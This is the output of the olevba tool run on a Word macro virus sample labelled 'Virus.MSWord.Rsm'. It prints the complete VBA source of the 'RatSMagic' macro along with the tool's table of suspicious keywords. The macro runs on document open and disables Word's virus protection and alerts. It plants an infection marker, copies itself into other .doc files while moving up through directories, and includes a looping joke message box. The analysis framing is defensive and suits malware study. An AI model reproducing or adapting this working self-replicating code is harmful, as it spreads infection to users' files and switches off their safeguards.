olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rsm-e48a40e849354c76efb5580f57fbb58676c63f7d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rsm-e48a40e849354c76efb5580f57fbb58676c63f7d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RatSMagic.bas 
in file: Virus.MSWord.Rsm-e48a40e849354c76efb5580f57fbb58676c63f7d - OLE stream: 'Macros/VBA/RatSMagic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.ScreenUpdating = False
WordBasic.DisableAutoMacros 0
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
rsminf: FileName$ = CurDir$ + "\" + Dir("*.doc")
On Error GoTo payl
Open FileName$ For Input As #1
Seek #1, 521
RSM$ = Input$(3, #1)
Close #1
If RSM$ = Chr$(1) + Chr$(18) + Chr$(191) Then GoTo chgdir
Open FileName$ For Append As #1
Seek #1, 523
Print #1, Chr$(1) + Chr$(18) + Chr$(191) + Chr$(0) + Chr$(0)
Close #1
rsmdoc = ActiveDocument.FullName
Application.Documents.Open FileName
Application.OrganizerCopy Source:=rsmdoc, Destination:=FileName, Name:="RatSMagic", Object:=wdOrganizerObjectProjectItems
Application.Documents.Save
ActiveDocument.Close
chgdir: ChDir ".."
GoTo rsminf
payl: If Rnd() <= 0.666 And Rnd() >= 0.666 Then GoTo JokE Else GoTo ecsit
JokE: MsgBox "RatSMagic by Reptile", , "bwahahahaha!!!"
GoTo JokE
ecsit:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

